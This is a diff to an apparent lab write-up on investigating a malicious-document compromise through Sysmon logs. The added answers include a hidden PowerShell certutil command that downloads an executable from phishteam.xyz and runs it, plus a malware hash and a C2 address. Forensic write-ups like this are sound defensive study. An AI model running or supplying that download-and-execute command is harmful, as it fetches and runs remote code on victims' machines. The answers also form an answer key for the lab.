@@ -70,7 +70,7 @@ So following this I will open `Timeline Explorer` to open the sysmon log as sugg
 
 ### Q4: The user of this machine was compromised by a malicious document. What is the file name of the document?
 
-In the description of the task we have a clue, that we should investigate child processes of WinWord.exe, this question Its more related to the executable itself. Its the first time using this viewer and maybe there is something Im missing but right now Im not liking it much.
+In the description of the task we have a clue, that we should investigate child processes of WinWord.exe, this question Its more related to the executable itself.
 So what I did was search for the name of the file in the search bar, and then identify its process ID, to again search for it. In this case since its the begining it could be related to a Process Creation, or in sysmon Event ID 1.
 Searching a little bit we will find the name of the file.
 
@@ -147,5 +147,38 @@ Now that we have the base64 string from **Q8** we can decode it, and it will hav
     C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
   </div>
 </details>
+
+### Q11: The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?
+
+For this one we already have some clues in the task, we know the parent process `explorer.exe`, the sysmon ID to search and the user. searching with this information will give us the answer.
+
+<details>
+  <summary>Click to reveal the answer</summary>
+  <div>
+    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
+  </div>
+</details>
+
+### Q12: Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?
+
+We can just search the name of the file downloaded and we will find an event of the execution of the file, that will provide us the answer.
+
+<details>
+  <summary>Click to reveal the answer</summary>
+  <div>
+    CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8
+  </div>
+</details>
+
+
+## Q13:
+
+<details>
+  <summary>Click to reveal the answer</summary>
+  <div>
+    resolvecyber.xyz:80
+  </div>
+</details>
+
 
 
